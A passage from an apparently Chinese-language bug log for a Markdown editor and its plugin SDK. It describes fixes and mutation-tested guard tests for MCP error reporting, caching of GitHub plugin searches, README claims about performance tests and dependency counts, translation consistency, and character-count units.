现在「说哪句话」是个纯函数 `AppMenuBar.updateMessage(...)`，
只做判断不做呈现，直接就能问它。

### 守卫（5 条）

1. 不可达 → 说「检查失败」，中英两种语言各验一次
2. **不可达但手里有上次查到的版本信息** → 仍然说检查失败。
   读者问的是**这一次**的结果
3. 可达且有新版 → 说出版本号
4. 可达且无新版 → 说「已是最新」
5. **守卫的守卫**：三句话必须是三个不同的字符串。
   若其中两句相同，上面四条会全绿而读者根本分辨不出

### 变异验证

- 去掉 `if (!reachable) return ...` → 第 1、2 条红
- 把 `update != null` 那句提到 `!reachable` 前面（缓存了旧版本就谎报有新版）→ 第 2 条红

### 涉及文件

`lib/ui/widgets/app_menu_bar.dart`；`test/ui/widgets/update_check_is_honest_test.dart`（新增）

---

## BUG-340：41 条插件测试，三个变异照样活着

官方翻译插件没有自己的测试目录——它由主应用的
`ai_translate_plugin_test.dart` 覆盖，41 条。对 `blocks.lua` 的分段规则做变异：

| 变异 | 结果 |
|------|------|
| `is_heading` 永远为假 | 红（说明测试确实在跑 Lua，不是加载失败） |
| **`is_blank` 不认制表符** | **存活** |
| **`closes()` 永远为假（围栏永不闭合）** | **存活** |
| **`is_blank` 不认 `\r`** | **存活** |

### 围栏那条最重

围栏不闭合 = **`` ``` `` 之后的整篇文档都被算作代码**，一整个块喂给模型。

已有一条 `a fenced block is not cut in half`，名字说的是「不被切成两半」，
断言是 `prompt contains code`——**围栏吞掉全文时这条断言照样成立**，
因为那一个请求就是整个文件。名字承诺的比它做的多。

而且这条路径**真的坏过**：`lua_dardo` 对 `("" ):match("^%s*$")` 返回 nil
（标准 Lua 会匹配），当年那个判空行的写法让每一个空行都不闭合围栏。
修过，没留守卫。

### 另外两条是 Windows 用户的日常

- **只含制表符的行**：用 tab 缩进的编辑器留下的「看着空、其实不空」的行。
  不认它，两段并成一段，模型拿到一个得自己猜结构的长句
- **CRLF 文档**：行按 `\n` 拆，所以每行尾都挂着 `\r`，空行拆完**只剩一个 `\r`**。
  不认它，**整篇从头到尾是一段**。这个编辑器为 `\r\n` 栽过一次
  （CLAUDE.md「换行符」那条）

### 守卫怎么写才能区分

关键是让「两块」和「一块」在外部可观测：**围栏后／空行后的那段放 4000 字符**，
它必须独占一个请求。于是——

- 分段正常 → 第一个请求里有前半、**没有后半**
- 分段失效 → 两半在同一个块里，第一个请求两边都有

三条测试，三个变异，一对一。

### 涉及文件

`test/services/ai_translate_plugin_test.dart`（+3 条，41 → 44）

---

## BUG-341：守卫建在没出事的那个仓库

`readme_images_exist_test` 的「翻译与英文 README 同形」，注释里写着它的来历：

> **The plugin SDK shipped a release** where all twelve were rewritten from an
> older copy

**而这条守卫只查主仓库的 12 份。** 从中文版删掉一整节，它全绿。
教训来自 SDK，守卫建在了编辑器上，出过事的那个仓库反而没人看。

补在 `sdk_schema_agrees_test` 里（它已经有找 SDK 仓库并在缺席时跳过的机制），
外加一条「守卫的守卫」：确实数到 11 份翻译——**一个不再存在的目录会让循环空转，
而空循环里的断言都是通过的**。

### 涉及文件

`test/services/sdk_schema_agrees_test.dart`

---

## BUG-342：一次对话，两个地方

### 读者报告

> 点击右侧边栏的「AI 助手」图标，怎么是弹窗样式？应该是带对话框的右侧边栏！

### 现象

从右侧边栏点开一个插件面板：

1. 抽屉打开了（300px，标题在上）
2. **但插件的提问弹在浮动卡片里**，浮在文档上方
3. 在卡片里回答之后，**结果落回抽屉**

一次问答，两个容器。读者打开抽屉是因为**他要看着那里**，问题却出现在别处。

### 根因：一个不对称

侧边栏早就能在自己里面画插件的界面树——`runInto` 有 `onUi` 回调，
而且那条测试的注释把理由写得很清楚：

> **Not in the card.** The reader opened this drawer, so this is where they
> are looking; the card is for commands started somewhere with no room of
> its own.

**同一条理由对提问同样成立，但提问没有对应的回调。** `PluginAskAction`
一律走 `pluginTipProvider.ask(...)`，也就是卡片。

### 修

补上这个对称：`PluginAskSink`，与 `PluginUiSink` 并列。

- 有 `onAsk` 就在那里问（右侧边栏提供它）
- 没有就还是卡片——**从菜单启动的命令没有自己的地盘，卡片对它仍然是对的**

抽屉里的问答与卡片里的是同样三部分：问题、插件给的选项（chips）、
一个已经填好上次答案的输入框。Enter 直接提交——读者在回答一个问题，
不是在写文档。取消/确认复用 `l10n.cancel` / `l10n.confirm`，
与卡片同一对键，措辞不会分叉。

### 一个时序陷阱

关掉抽屉要把等待中的问题作废（读者关掉它就是拒绝），**但 `dispose` 不能这么做**：
完成那个 completer 会唤醒命令去跑它的收尾，而收尾要读的 provider
正随着 widget 一起消失。所以取消只发生在读者主动开关抽屉时，
`dispose` 只清状态。

这是写测试时撞出来的——`Tried to read a provider from a ProviderContainer
that was already disposed`。

### 守卫

`right_sidebar_test`「a panel that asks a question gets to ask it」原本只断言
「问题被问出来了」，没说在哪。现在加了：

- 那句问题**在 `RightSideBar` 的子树里**
- 只出现一次（卡片若也在问就是两次）
- 输入答案后按 Enter，**插件收到了它**，结果落在同一个抽屉里

变异：撤掉侧边栏的 `onAsk` → 红。

### 涉及文件

`lib/ui/widgets/plugin_command_actions.dart`；`lib/ui/widgets/right_side_bar.dart`；
`test/ui/widgets/right_sidebar_test.dart`

---

## BUG-343：句子说了实话，字段没有

接上 `run_plugin_command`（FEAT-131）之后，对读者正在跑的那一版做了一轮实测：

| 请求 | 回话 | `isError` |
|------|------|-----------|
| `activate_tab` 一个不存在的标签 | there is no tab 没有这个标签 | **False** |
| `close_pane` 一个没打开的槽 | no corner pane was open | **False** |
| `close_pane slot=middle` | unknown slot "middle" | **False** |
| `open_file`（已撤下） | action "open_file" is not available | **False** |

**今早修的谎报只修了句子。** MCP 里表示「这次调用没做到」的是 `isError`，
**而调用方看的正是这个字段**——每一次拒绝在协议层都写着成功。

一个 agent 照着 `isError` 判断，会认为它切过去了、关掉了、跑起来了。

### 修

`perform` 不再返回一个句子，返回 `McpOutcome`——句子加上做没做到：

```dart
typedef McpOutcome = ({String said, bool ok});
McpOutcome mcpDid(String said) => (said: said, ok: true);
McpOutcome mcpRefused(String said) => (said: said, ok: false);
```

`_control` 用 `ok` 决定 `isError`。**句子一个字没改**——拒绝不因为被标成拒绝
就变含糊。

### 守卫

三条：做到的不是错误、没做到的是错误（且句子照说）、
**根本没有处理器时也是错误**。

变异两个方向：无条件报成功 → 第二条红；无条件报失败 → 第一条红。

### 涉及文件

`lib/services/mcp_tools.dart`；`lib/providers/mcp_provider.dart`；
`test/services/mcp_action_test.dart`

---

## BUG-344：每次启动都去问一遍，问到没配额

### 读者报告

> 默认插件搜索报错：
> `GitHub is rate-limiting searches from this machine; try again in 819 seconds.`

### 一次「发现插件」有多贵

| 请求 | 数量 |
|------|------|
| `search/repositories?q=topic:marktext-plus-plugin` | 1 |
| 每个搜到的仓库一次 `/releases` | **最多 30** |

未认证配额：搜索 10 次/分钟，**其余 60 次/小时**。所以真正先见底的是第二种——
**一次发现最多吃掉 30/60**。开两三次编辑器，配额就没了，
而读者在插件列表的位置看到的是一句「819 秒后再试」。

面板本来就做了节流：**每次启动只搜一次**，失败也不自动重试（`shouldSearchOnOpen`）。
那挡住了「每瞥一眼一个请求」，挡不住「每次启动一整轮」。

### 修：把结果留到下次启动

`PluginCatalogService` 接收一个缓存文件（应用支持目录下的
`plugin-catalog.json`），**六小时**内直接用它。

- 六小时：一个下午开几次编辑器只花一次搜索；今早发布的插件今天仍找得到
- **刷新按钮绕过它**——读者按那个键，就是要现在的答案
- **只在整轮成功后才写**：中途撞上限流的那次结果比实际少，
  把它留六小时等于把其余插件藏六小时

### 几个边角

- **来自未来的缓存不用**：时钟往回调过，年龄是负数——那不叫「还能再新鲜六小时」，
  那是这段代码没法判断的文件
- 写了一半的缓存、读不出的条目 → 当作没有缓存，代价是一次搜索，不是一张空列表
- **`permissions` 不写进缓存**：搜索结果本来就没有权限（那要下载包才知道），
  缓存一个空列表会和「这个插件什么都不申请」长得一模一样

### 守卫（8 条）

往返完整性（含 `isPrerelease`——「0.1.3」和「0.1.3 预发布」不是同一个承诺）、
窗口内用、窗口外不用、未来时间不用、半截文件、没有文件、
带 http 地址的条目整份作废、**刷新不吃缓存**。

四个变异一对一：去掉过期检查、去掉未来检查、让 `refresh` 失效、
（写缓存那步由「只在成功后写」的注释与整轮成功路径共同保证）。

### 涉及文件

`lib/services/plugin_catalog_service.dart`；`lib/models/plugin_catalog_entry.dart`；
`lib/ui/widgets/plugin_panel.dart`；`test/services/plugin_catalog_cache_test.dart`（新增）

---

## BUG-345：日志里只有一行，说 MCP 启动了

诊断读者报的插件错误时，通过 MCP 读他机器上的日志，全部内容是：

```
[2026-09-08T14:19:00.807992] [INFO] MCP server listening on port 10100
```

而那台机器上**正有一个插件读不出来**，面板上红字写着原因。

`read_logs` 的自我介绍是：

> Recent lines from the editor log, including plugin output.
> **Use this to find out what just happened.**

**「刚发生了什么」里最该有的那件事，一个字也没有。**

BUG-278 修的是「原因写好了没送达读者」——送到了面板上。
**没送到日志里。** 面板是给读者看的；日志是提交问题的人、
读 `read_logs` 的 agent、和事后排查的人**唯一能拿到的东西**。

### 修

`loadInstalled` 的 catch 里补一条 warning，`source` 用插件目录名，
**用的是面板上那同一句话**——不是类名，是「哪个键、本该是什么」。

### 守卫

日志里恰好一条、且指出了具体的键、且不含 `FormatException` 这样的类名。
变异：把那条日志去掉 → 红。

### 涉及文件

`lib/services/plugin_manager.dart`；`test/services/plugin_problems_test.dart`

---

## BUG-346：`contains` 在字符串上会误伤

写 FEAT-134 时踩了一次：断言「内存读数不该是零」写成

```dart
expect(ResidentMemory.suffix(), isNot(contains('0 MB resident')));
```

**「150 MB resident」里就含有「0 MB resident」。** 单独跑那个文件时机器报了个
非整十的数，绿；跑全量时正好整十，红。一个**只在被测值恰好落在某个形状上**
才失败的断言。

**顺手把同类扫了一遍**（`grep "isNot(contains(" test/`，20 处），
找到另一处真脆弱的：

```dart
// 意思是「这条 403 不该被说成限流」
expect(message.toLowerCase(), isNot(contains('rate')));
```

**"generated"、"separate"、"moderate" 都含 `rate`。** 消息换个说法就可能
一边通过这条断言、一边说着完全相反的话。改成查真正会出现的词——
`rate-limiting` 和 `try again`。

变异验证：把非限流的 403 也说成限流 → 红。

其余 18 处查的是完整标签、文件名、类名，误匹配不了。
`isNot(contains('0xff'))` 是有意的前缀匹配（CSS 里不该出现任何 Dart 颜色字面量）。

### 规律

在**数字、路径、标识符**上下文里用 `contains` 之前，先问：
**有没有一个合法的值，把我要排除的这个串包含进去？**

### 涉及文件

`test/services/plugin_search_failure_test.dart`；
`test/core/diagnostics/resident_memory_test.dart`

---

## BUG-347：README 说有测试盯着性能，那样的测试不存在

走发布清单第 5 项（README 是否反映本版真实能力）时读到：

> **📄 Large files** — Parsing, highlighting and search are all single-pass and
> **budgeted by tests that fail if a change makes them slower**

**查了：全套 2776 条里只有两条断言耗时**，一条关于表格单元格（300 ms 上限），
一条关于高亮缓存（40 ms）。**没有任何一条盯着解析、高亮或搜索的性能。**

这和 BUG-266 完全同型（README 用 12 种语言承诺「安装前给你看权限」，从未成立），
而且更麻烦：**这句话正是没人去建那个测试的原因——它说已经有了。**
今天发现「三条主张一个都没测量」时，README 已经宣称测量存在了一年。

顺带发现测试数写着 **2432**，实际 **2777**。

### 修法：建那个测试，而不是改措辞

用户的第一条要求是「任何改动都不得牺牲……大文件表现」。
**一条会失败的预算测试正是执行它的方式。**

`test/services/cost_stays_linear_test.dart`：**四倍的文档，不超过六倍的时间。**

### 为什么是比值，不是墙钟上限

墙钟上限是显而易见的做法，也是错的：宽到能容忍慢 CI 的上限会放行真实退化
（本仓库有过 1.4 秒的解析通过 2 秒上限的记录），紧的又会在忙碌的机器上无故变红。
**比值不关心机器多快**，它问的是代价还跟不跟着输入走——
而那正是本仓库四次二次方退化（BUG-287~291）破坏掉的性质。

### 三个参数都是量出来的，不是拍的

| 参数 | 值 | 依据 |
|------|-----|------|
| 规模跨度 | 1x vs **4x** | 2x 时，十分之一的工作退化成二次方只把比值推到 2.18，漏掉 |
| 阈值 | **6** | 实测比值 4.04~4.49；阈值 5 时余量只有 17%，**第一批运行里就无故红了一次** |
| 文档大小 | **160 KB** | 60 KB 时同一份解析的耗时在两次运行间差 30%，160 KB 时差 8%——分母不稳，比值就没意义 |

**一个会自己变红的性能测试比没有更糟**：它教会所有人在它红的时候继续走。

### 灵敏度，实测而非假设

- **搜索**：加一段二次方扫描 → 比值 **34.2 倍**，红
- **解析**：灵敏度较低，因为它自己的代价就是分母（160 KB 约 110 ms），
  退化要占到五分之一才会越线

这两点写进了测试的文档注释里——**不假装它抓得住一切**。

### 踩过的坑

第一次验证解析时，变异「加一个 O(n²) 的 substring 循环」**测出来比原版还快**。
原因是 `markdown.substring(0, i).length` 恒等于 `i`，**编译器把整个循环折叠掉了**。
变异必须先证明它真的改变了行为——否则「测试没红」证明不了任何事。

### 涉及文件

`README.md`；`test/services/cost_stays_linear_test.dart`（新增，3 条）

---

## BUG-348：修上一句话时，自己写下了下一句不实的

BUG-347 把 README 那句空头承诺换成了真的：

> **Parsing, highlighting and search** are all single-pass, and a test fails if
> four times the document costs more than six times the work

**建的测试只盖了解析和搜索。** 高亮没盖——而且盖不了：

`syntax_highlighter.dart` 自己的注释里就有实测表：

| 大小 | 首帧 |
|------|------|
| 64 KB | 1.2 s |
| 128 KB | 1.3 s |
| **256 KB** | **8.0 s** |
| 384 KB | 24 s |
| 512 KB | 45 s |

**两倍的规模，六倍的时间。** 高亮的代价对 span 数是超线性的，
这不是缺陷，是它的性质——「四倍不超过六倍」那条守卫对它**本来就不成立**。

所以那句话在我手上从「承诺一个不存在的测试」变成了
「把一条真守卫套在它管不着的东西上」。**第二种更难发现**，
因为句子里三分之二是真的。

### 高亮真正的守卫是上限

`highlight_threshold_test`（4 条）盯着 128 KB 这个数：在合理区间内、
以下会上色、以上不上色**且文档仍可编辑**、缩小后颜色回来。

机制不是「保持线性」，是「超过就不做」。README 现在这样说。

### 教训

**改一句不实的话时，逐个短语核对它提到的每样东西。**
「parsing, highlighting and search」是三样，我建了两样的守卫就换了措辞。

### 涉及文件

`README.md`

---

## BUG-349：一个数字，十九处，两个说法，都不对

顺着 BUG-347 的查法（README 里的具体数字逐个核）继续，查依赖数：

| 出处 | 说的 |
|------|------|
| README 正文第一段 | **22** |
| README 功能表「快速启动」 | **23** |
| README 对比表 | **22** |
| 11 份翻译的功能表 | **23** |
| 11 份翻译的对比表 | **22** |
| **`pubspec.yaml`** | **26** |

**一份文件里自己跟自己矛盾**（22 和 23 隔着五十行），十二份文件全都跟事实矛盾。

「轻量级」是这个编辑器的第一条主张，而**依赖数是它唯一的量化指标**。

### 修

十九处全部改成 26（`dependencies:` 下 27 条减去 `flutter` SDK 本身）。

### 守卫

`readme_dependency_count_test`：**从 `pubspec.yaml` 数出来，再去每份 README 核**。
不是把 26 写进测试——那只会变成第二十处要手动维护的地方。

四个变异，一对一：

| 变异 | 结果 |
|------|------|
| 英文说回 23 | 红 |
| **只有俄语说错** | 红，且指名是 `README_ru-RU.md` 的哪一行 |
| **加一个依赖而文档没跟上**（真实场景） | 红，说「pubspec 里是 27 个」 |
| 解析 pubspec 的正则坏掉 | 被「守卫的守卫」抓住——否则它会数出 0，然后每份文档都得写「0 个依赖」才能通过 |

### 阿拉伯语的一个坑

匹配「直接依赖」这个说法时，阿拉伯语词根 `اعتماد` **同时是「依赖」和「凭据」**，
于是「编辑器持有 API 凭据」那一行被当成了依赖数声明。
配上 `مباشر`（直接）才分得开。

### 涉及文件

`README.md` 与 11 份翻译；`test/services/readme_dependency_count_test.dart`（新增）

---

## BUG-350：写给插件作者的上限，也是两份

BUG-349 的查法（一个数字散在多份文档里，没人对账）用到 SDK 上，
它只有两个具体数字，都在同一句话里：

> **A misspelled node refuses the whole tree**… The same goes for a tree
> deeper than **12 levels** or larger than **500 nodes**

编辑器这边是 `PluginUiLimits.maxDepth = 12` / `maxNodes = 500`。
**今天一致，无人对账**——而插件作者是照文档写的，写超了整棵树被拒。

### 守卫

`sdk_schema_agrees_test` 加一条：两个上限从 `plugin_ui.dart` 读出来，
去 12 份 SDK README 里核。

三个变异一对一：

| 变异 | 结果 |
|------|------|
| **编辑器把上限改成 300，文档没跟上**（真实场景） | 红 |
| 只有日语版把 12 写成 10 | 红，指名是哪份 |
| 阿拉伯语删掉那句 | 红，指名是哪份 |

### 两个坑

**一、句子会跨行。** 英文里 "12 levels" 和 "500 nodes" 分在两行上，
按行查会误报「说了一个没说另一个」。改成按**段落**（空行分隔）查。

**二、数字不是到处都写成数字。** 阿拉伯语版把它们写成数词——
`اثنتي عشرة`（十二）、`خمسمئة`（五百）——这在阿拉伯语正式文体里是常规。
第一版守卫据此报告「阿拉伯语版完全不提这两个上限」，
**而它说得和任何一份一样清楚**。守卫现在认得两种写法。

假设「数字不翻译」险些让我去给一份完好的翻译「补」内容。

### 涉及文件

`test/services/sdk_schema_agrees_test.dart`

---

## BUG-351：那条守卫自己应验了它注释里的话

BUG-347 建的 `cost_stays_linear_test`，注释里写着：

> 一个会自己变红的性能测试比没有更糟——它教会所有人在它红的时候继续走

**它第一次上 CI 就红了。**

```
Expected: a value less than <5754>
Actual: <5804>
```

比值 6.05，阈值 6。本机六次全绿（4.04~4.49），**CI 一次就越线**。

### 教训：本机的稳定不代表 CI 的稳定

我按"跑五次都绿"就推了。共享 runner 的 CPU 竞争、缓存、限流，
本机测不出来。**五次绿只证明这台机器此刻是稳的。**

### 两处修

**一、搜索的绝对时间太小。** 160 KB 搜一次只要 320 µs，
进函数的固定开销占了可观一份——**而那份不随文档增长**，
于是它抬高了小文档的读数、压低了大文档的相对增量……在慢机器上反过来。
现在一次量 **20 遍搜索**（20 ms 量级），固定开销占比降到二十分之一。

方差随之收窄：改前 3.80~4.26（跨度 0.46），改后 4.59~4.88（跨度 0.29）。

**二、阈值 6 → 8。** 这个取舍要说清楚：

| | |
|---|---|
| **真正的二次方**在 4 倍规模下是 **16 倍** | 阈值 5/6/7/8 都抓得住 |
| 阈值只决定**部分退化**能抓多小 | 而那本来就难抓——实测解析要退化到占自身五分之一，阈值 6 时才越线 |

**所以放宽换来的是稳定，损失的是本来就抓不太住的那部分。**

变异复验：搜索退化成二次方 → 比值 **27.8 倍**，红。

### 涉及文件

`test/services/cost_stays_linear_test.dart`

---

## BUG-352：报得出四个命令，一个都不接受

读者装上带 FEAT-131 的版本后，第一次在真机上试 `run_plugin_command`：

```
run_plugin_command(pluginId: "com.marktextplus.ai-translate",
                   command: "ai.nonexistent")
→ "com.marktextplus.ai-translate" has no command "ai.nonexistent"; it has
                                                                       ↑ 空的
```

**「it has」后面什么都没有**，而同一个接口的 `get_state` 刚刚报告这个插件有
四个命令。

### 两份清单，两个字段

| 谁 | 读哪个字段 |
|----|-----------|
| `get_state` 报告命令 | `plugin.menus` 的 id |
| 我写的 handler 检查命令 | `plugin.commands` |

`commands` 是另一个用途的字段，对这个插件是**空的**。
所以接口**报出四个命令，然后拒绝其中每一个**——
而给出的理由是「它有：」后面跟着一片空白。

一个照着 `get_state` 调用的 agent，会被自己刚拿到的名单拒绝。

### 同时发现：拒绝仍报成功

BUG-343 把每个动作的拒绝接进了 `isError`。**FEAT-131 的两条拒绝漏了**：

```dart
return mcpDid(await run(pluginId, command));   // 一律当成功
```

实测：插件不存在 → `isError: False`；命令不存在 → `isError: False`。
这是两次改动交叉处的漏网：先写的 FEAT-131 返回字符串，
后改的 BUG-343 换成了 `McpOutcome`，换的时候把 handler 的答案整个包成了「做到了」。

### 修

**不是把 handler 里的字段改对就完事**——那样还是两处各算各的。
`PluginManifest.commandIds` 成为唯一来源，`get_state` 与 handler 都用它。

拒绝改为 `mcpRefused`，与其它动作一致。

### 守卫

- `plugin_manifest_test`：`commandIds` 就是菜单项的 id，
  且**明确断言 `commands` 是空的**——正是这个区别造成了缺陷
- `mcp_action_test`：跑通的不是错误；插件不存在是错误；命令不存在是错误
  **且名单不能为空**（`isNot(endsWith('it has '))`——空名单说明查错了字段，
  不是这个插件真的没有命令）

变异：`commandIds` 改回读 `commands` → 红。

### 本机为什么测不出来

handler 在 widget 层（`home_screen`），而当时的测试只到 `McpToolset`。
**这两个缺陷都是连上真机才现形的，那时全套 2780 条全绿。**

### 涉及文件

`lib/services/plugin_manifest.dart`；`lib/providers/mcp_provider.dart`；
`lib/ui/screens/home_screen.dart`；`test/services/plugin_manifest_test.dart`；
`test/services/mcp_action_test.dart`

---

## BUG-353：四种语言的插件作者，不知道有右侧边栏

用 CLAUDE.md 刚写下的第三条视角查 SDK 的图标名时，顺手数了各语言文档里
`panels` 出现几次：

| 文档 | `panels` |
|------|---------|
| 英文、阿拉伯、西、法、意、葡×2、俄 | 2 次 |
| **德、日、韩、中** | **0 次** |

**整个「右侧边栏面板」的能力，在四种语言的文档里不存在。**
manifest 的字段清单里少那一行，说明它的两段话也没有。
读这四种语言的插件作者，不知道自己可以往右侧边栏放东西。

### 形状守卫为什么抓不到

`sdk_schema_agrees_test` 有一条「翻译与英文同形」——它数**标题数、三级标题数、
代码块数**。而 `panels` 那段**既无标题也无代码块**，只是两个自然段。
十二份文件数出同样的形状，其中八份多一整个能力。

### 顺带修：一句已经不成立的说明

那两段里的第二段说：

> a command that returns `ask` … is reported as text there rather than
> stopping to ask, **because a drawer is not a conversation**

**BUG-342 已经让抽屉能提问了**（问题、选项、填好上次答案的输入框都在抽屉里）。
这句话是我自己的改动造成的过时——八份有这句的文档全部改写，
四份新补的直接写新行为。

### 新守卫

**schema 允许的每个贡献点，12 份文档都要提到。**

字段名不翻译，所以这一条可以机械地查——而它正好补上了形状守卫的盲区：
**能力的有无，不体现在标题数上。**

变异：让中文版重新失去 `panels` → 红，指名「README_zh-CN.md: 不提 `panels`」。

### 涉及文件

SDK：`README.md` 与 11 份翻译；主应用：`test/services/sdk_schema_agrees_test.dart`

---

## BUG-354：同一个盲区，另一份文档

BUG-353 的教训是：**一条守卫只看得见它数的那个维度**。
SDK 的形状守卫数标题数与代码块数，所以四份翻译整个少了一个能力而它毫无察觉。

主仓库有**同一条守卫**（`readme_images_exist_test` 的「翻译与英文同形」），
所以有**同一个盲区**。

查了：12 份翻译**都是 46 行能力**，`Mermaid`/`KaTeX`/`GBK`/`UTF-16`/`.docx`/`MCP`
全都提到——**今天没有缺口**。

但没人在看这个维度。补两条：

1. **能力行数一致**：功能表里加粗的行数，各语言必须与英文相同。
   一行被删掉时，标题数和代码块数都不动
2. **不翻译的名字都在**：`Mermaid`、`KaTeX`、`GBK`、`UTF-16`、`.docx`、`MCP`。
   这一条查的是另一种损坏——**行数没变，但那一行讲的东西被换掉了**

变异各自对应：删掉韩语版第 11 行能力 → 第 1 条红（`45 ≠ 46`）；
把韩语版的 Mermaid 全改成别的词（行数不变）→ 第 2 条红。

### 建守卫时该问的那句话

> **什么样的损坏会让这些数字保持不变？**

那就是它的盲区。补法通常不是把守卫做复杂，是再加一条查别的维度的。

### 涉及文件

`test/services/readme_images_exist_test.dart`

---

## BUG-355：脚本要的键，和 manifest 声明的键

官方插件的多语言有一条守卫，查的是「**manifest 声明的**每个键在 12 种语言里都有」——
name、description、菜单标题、设置标题。

**脚本要的是另一份键**。`sdk.t('idea.shorter')` 拿不到就返回键名本身，
读者会在该出现一句话的地方看到 `idea.shorter`。

查了：脚本用 11 个键，manifest 声明 21 个，**今天全部对得上**。
但两份清单之间没有任何东西。

### 两次才写对

**第一版只匹配 `t('字面量')`**，找到 5 个键，变异「删掉 manifest 里的 `idea.shorter`」
**没红**——因为那 6 个写作建议存在一张表里：

```lua
M.WRITING_IDEA_KEYS = { "idea.clearer", "idea.shorter", ... }
function M.writing_ideas(t)
  for i, key in ipairs(M.WRITING_IDEA_KEYS) do out[i] = t(key) end
end
```

**通过变量传给 `t()`**，字面量匹配抓不到。正是这 6 个当年出过 BUG-300
（「AI 写作的六个建议在每种语言里都是英文」）。

**第二版改成「任何长得像键的字符串都是候选」**，减去两类同形但不是键的东西：
`require` 的模块名（`lib.prompts`）、manifest 自己声明的命令 id（`ai.write`）。
两类都能机械识别，所以误报可控。

### 验证

| 变异 | 结果 |
|------|------|
| manifest 删掉键表里在用的 `idea.shorter` | 红，指名 `{idea.shorter}` |
| 脚本新增一个未声明的 `idea.brandnew` | 红，指名 `{idea.brandnew}` |
| 正则匹配不到任何东西 | 被「守卫的守卫」抓住：「只找到 0 个候选键」 |

### 涉及文件

`test/services/ai_translate_plugin_test.dart`

---

## BUG-356：设置页是一个承诺

manifest 声明 6 个设置字段，插件设置页照它画出输入框。
**没有任何东西保证脚本会去读它们。**

一个从不被读的字段，是让读者往里打字、然后什么也不发生的框——
而页面上没有一处会说这件事。

查了：6 个全都被读 ✓。加守卫。

### 同一个盲区，一小时内第二次骗到我

第一次扫描用的是 `storage.get('字面量')`，结论是
**「6 个设置字段代码一个都不读」**。

先验证再下结论——查了代码，它们通过一个本地辅助函数读：

```lua
local function setting(key, fallback)
  local written = storage.get(key)     -- 变量，不是字面量
  ...
end
setting("writingSystem", M.DEFAULT_WRITING_SYSTEM)
```

**和 BUG-355 里那六个写作建议一模一样的形状**（键存在表里，
`t(key)` 变量传参）。一小时之内，同一个盲区让我误判了两次
「代码没在用某样东西」。

所以这条守卫查的是**裸字符串**（`"writingSystem"` 出现在任何 lua 文件里），
不是查调用——查调用会找到 0 个，然后把 6 个全报成死字段。

### 变异

给 manifest 加一个脚本不读的 `neverRead` → 红，指名 `[neverRead]`。

### 涉及文件

`test/services/ai_translate_plugin_test.dart`

---

## BUG-357：`### Fixed` 写了两遍

发版前该查的文档，这次查到两个插件仓库的 CHANGELOG：

| 仓库 | 问题 |
|------|------|
| SDK | `[Unreleased]` 里有**两个 `### Added`**；而且**最近四次改动一条都没记** |
| 官方插件 | `[Unreleased]` 里有**两个 `### Fixed`** |

重复小节是这么来的：写新条目时另起了一个标题，而不是加进上面已有的那个。
**内容一条没丢**，但读者找「这版修了什么」，看到第一份列表就走了——
下面还有一份，隔着 `### Internal`。

SDK 落后的四条（四种语言缺 panels、ask 说明改写、裸 `return` 警告、图标枚举）
已补上；两边的重复小节合并。

### 守卫

按**发布小节**查重复标题，不是按文件——同一个 `### Fixed` 出现在下一个版本里
完全正确。

拆成两条放：主仓库的在 `repository_documents_test`，
两个插件仓库的在 `sdk_schema_agrees_test`（那里已有「仓库不在就跳过」的机制）。

**为什么要拆**：一开始写在一处，`repo_dependent_tests_test` 立刻红了——
「读了兄弟仓库，但一个 skip 都没有」。那条守卫是对的：
主仓库的 CHANGELOG 在 CI 上查得了，插件仓库的查不了，
混在一个文件里就得整体跳过，等于 CI 上不查。

三个变异各自指名：SDK、官方插件、主仓库各造一个重复小节，都被抓出是哪个仓库、
哪个版本、哪个标题。

### 涉及文件

SDK 与官方插件的 `CHANGELOG.md`；
`test/services/repository_documents_test.dart`；`test/services/sdk_schema_agrees_test.dart`

---

## BUG-358：79 个字符写进去，回话说 90

在读者机器上做边界内容测试时撞见的：写入一段含 emoji 与组合字符的文本，

```
Python 数出 79 个字符
MCP 回话：wrote 90 characters
```

差在 `👨‍👩‍👧‍👦` 和 `𝔘𝔫𝔦𝔠𝔬𝔡𝔢` 这类字符——**编辑器在用两把尺子**：

| 谁 | 单位 | 那段文字 |
|----|------|---------|
| 状态栏 | **code point**（`runes`） | 79 |
| MCP 的 `get_state` / `set_content` | **UTF-16 unit**（`.length`） | 90 |

两处都自称 `characters`。同一个文档，agent 看到 90、读者看到 79。

### 两个选择都是对的，所以不能改成一样

状态栏用 code point 是**有意的**，注释就在那里：

> Counted in code points, so an emoji or a rare ideograph is one character
> rather than the two UTF-16 units it occupies.

**读者数的是这个。**

而 MCP 不能跟着改：`get_state` 会被轮询，改成 code point 就要**在每次回答时
遍历每一个打开的文档**——8 MB 的文件要几十毫秒，开几个就更久。
一个诊断接口不该随文档变慢。

### 所以修的是「不说清楚」

`get_state` 的描述现在讲明白：它数 UTF-16 单位，状态栏数 code point，
一个 emoji 在那边是一、在这边是二，**而且说了为什么两边不一样**——
读者要的是他会去数的那个数，接口要的是能和它手里的字符串对上的那个数。

守卫锁住这个说明（描述里必须同时出现 `UTF-16` 和 `code point`），
否则它会像别的注释一样漂走。

### 顺带：边界内容实测

同一轮在真机上试了六种：12 万字符的单行、60 层嵌套列表、
RTL 与组合字符混排、只有空白、全部未闭合（``` `<!--` `[^` `$$` `**` `|`）、
300 个空列表项。

**全部正常**，写入 58~578 ms，每次都切一遍预览也没有卡顿或报错，
测完日志里 error 与 warning 都是空的。

### 涉及文件

`lib/services/mcp_tools.dart`；`lib/providers/mcp_provider.dart`；
`test/services/mcp_action_test.dart`

---

## BUG-359：验证过的东西，没留下来

BUG-358 那轮在读者机器上试了六种没人会故意写的文档，全部正常。
**而本机测试里，其中两种一条都没有**：

| 输入 | 本机有覆盖吗 |
|------|-------------|
| 12 万字符的单行 | **没有** |
| 只有空白（空格、制表符、全角空格、空行） | **没有** |
| 60 层嵌套列表 | 有（`quote_inline_reuse_test` 顺带） |
| 六种构造同时未闭合 | 有（BUG-287~291 各自的测试） |
| 300 个空列表项 | 有（BUG-319） |
| RTL + 组合字符 + 星外字符 | 有（编码相关的测试顺带） |

**在真机上验证过一次，不等于以后还成立。** 那次验证花了一台机器和一次连接；
本机跑一遍花一秒。

### 六条测试

固化下来，并且断言的是**该断言的东西**：

- 60 层嵌套那条**不断言层级形状**——四个空格在 CommonMark 里是代码块，
  所以深处的行本就不再是列表项。断言的是「解析得出来、文字都还在」
- 未闭合那条**带耗时上限**（500 ms）——这六种构造每一个都曾经背过一个
  二次方正则，放在一起是最坏的情况
- RTL 那条断言 `characters < text.length`ーー**星外字符必须被数成一个**，
  那正是状态栏与 MCP 的分歧点（BUG-358）

### 变异

